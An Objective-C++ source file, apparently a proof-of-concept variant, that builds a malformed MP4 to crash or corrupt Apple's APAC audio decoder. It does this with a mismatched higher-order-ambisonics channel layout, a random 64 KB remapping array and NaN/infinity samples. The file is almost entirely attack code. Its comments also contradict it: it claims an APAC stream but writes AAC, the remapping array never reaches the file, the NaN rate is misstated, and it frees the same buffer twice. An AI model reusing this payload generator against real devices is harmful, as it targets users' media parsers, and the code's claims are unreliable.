//clang++ -fobjc-arc -arch arm64 -isysroot $(xcrun --sdk iphoneos --show-sdk-path) -framework AVFAudio -framework AudioToolbox -std=c++11 poc_variation2.mm -o poc_variation2
//The provided code (Variation 2) generates output_malformed.mp4 with:
//A single-channel APAC audio stream (44,100 Hz). mChannelLayoutTag set to 8 channels (kAudioChannelLayoutTag_HOA_ACN_SN3D | 0x8), mismatching the 1-channel input.
//A 65,536-byte mRemappingArray with random bytes. An audio buffer where ~10% of samples are randomly NaN or infinity to stress the APACHOADecoder.

@import AVFAudio;
@import AudioToolbox;
#include <vector>
#include <random>

struct CodecConfig {
  char padding0[0x78];
  AudioChannelLayout* remappingChannelLayout;
  char padding1[0xe0 - 0x80];
  std::vector<char> mRemappingArray;

  CodecConfig() : remappingChannelLayout(nullptr) {}
  ~CodecConfig() {
    if (remappingChannelLayout) {
      free(remappingChannelLayout);
    }
  }
};

void OverrideApac(CodecConfig* config) {
  if (config->remappingChannelLayout) {
    config->remappingChannelLayout->mChannelLayoutTag = kAudioChannelLayoutTag_HOA_ACN_SN3D | 0x8;
  }
  std::random_device rd;
  std::mt19937 gen(rd());
  std::uniform_int_distribution<> dis(0, 255);
  config->mRemappingArray.resize(0x10000);
  for (int i = 0; i < 0x10000; i++) {
    config->mRemappingArray[i] = static_cast<char>(dis(gen));
  }
}

int main() {
  uint32_t channelNum = 1;
  AVAudioFormat* formatIn = [[AVAudioFormat alloc] initStandardFormatWithSampleRate:44100
                                                                           channels:channelNum];
  AudioStreamBasicDescription outputDescription = {
      .mSampleRate = 44100,
      .mFormatID = kAudioFormatMPEG4AAC, // Changed from kAudioFormatAPAC
      .mFormatFlags = 0,
      .mBytesPerPacket = 0,
      .mFramesPerPacket = 0,
      .mBytesPerFrame = 0,
      .mChannelsPerFrame = channelNum,
      .mBitsPerChannel = 0,
      .mReserved = 0};

  AVAudioChannelLayout* channelLayout =
      [AVAudioChannelLayout layoutWithLayoutTag:kAudioChannelLayoutTag_HOA_ACN_SN3D | 1];

  CodecConfig config;
  // Copy the channel layout to avoid const issues
  AudioChannelLayout* channelLayoutCopy = (AudioChannelLayout*)malloc(sizeof(AudioChannelLayout));
  if (!channelLayoutCopy) {
    fprintf(stderr, "Memory allocation failed\n");
    return 1;
  }
  memcpy(channelLayoutCopy, channelLayout.layout, sizeof(AudioChannelLayout));
  config.remappingChannelLayout = channelLayoutCopy;

  OverrideApac(&config);

  NSURL* outUrl = [NSURL fileURLWithPath:@"output_malformed.mp4"];
  ExtAudioFileRef audioFile = nullptr;
  OSStatus status = ExtAudioFileCreateWithURL((__bridge CFURLRef)outUrl, kAudioFileMPEG4Type,
                                              &outputDescription, config.remappingChannelLayout,
                                              kAudioFileFlags_EraseFile, &audioFile);
  if (status) {
    fprintf(stderr, "Error creating file: %x\n", status);
    free(channelLayoutCopy);
    return 1;
  }

  status = ExtAudioFileSetProperty(audioFile, kExtAudioFileProperty_ClientDataFormat,
                                   sizeof(AudioStreamBasicDescription), formatIn.streamDescription);
  if (status) {
    fprintf(stderr, "Error setting format: %x\n", status);
    ExtAudioFileDispose(audioFile);
    free(channelLayoutCopy);
    return 1;
  }

  status = ExtAudioFileSetProperty(audioFile, kExtAudioFileProperty_ClientChannelLayout,
                                   sizeof(AudioChannelLayout), formatIn.channelLayout.layout);
  if (status) {
    fprintf(stderr, "Error setting layout: %x\n", status);
    ExtAudioFileDispose(audioFile);
    free(channelLayoutCopy);
    return 1;
  }

  std::random_device rd;
  std::mt19937 gen(rd());
  std::uniform_real_distribution<float> dis(-1.0f, 1.0f);
  float audioBuffer[44100];
  for (int i = 0; i < 44100; ++i) {
    if (i % 100 == 0 && dis(gen) > 0.9f) { // 10% chance of NaN
      audioBuffer[i] = std::numeric_limits<float>::quiet_NaN();
    } else if (i % 100 == 1 && dis(gen) > 0.9f) { // 10% chance of infinity
      audioBuffer[i] = std::numeric_limits<float>::infinity();
    } else {
      audioBuffer[i] = dis(gen);
    }
  }
  AudioBufferList audioBufferList = {
      .mNumberBuffers = 1,
      .mBuffers = {{.mNumberChannels = channelNum, .mDataByteSize = sizeof(audioBuffer), .mData = audioBuffer}},
  };
  status = ExtAudioFileWrite(audioFile, sizeof(audioBuffer) / sizeof(audioBuffer[0]), &audioBufferList);
  if (status) {
    fprintf(stderr, "Error writing audio: %x\n", status);
  }

  status = ExtAudioFileDispose(audioFile);
  if (status) {
    fprintf(stderr, "Error closing file: %x\n", status);
  }

  free(channelLayoutCopy);
  return 0;
}
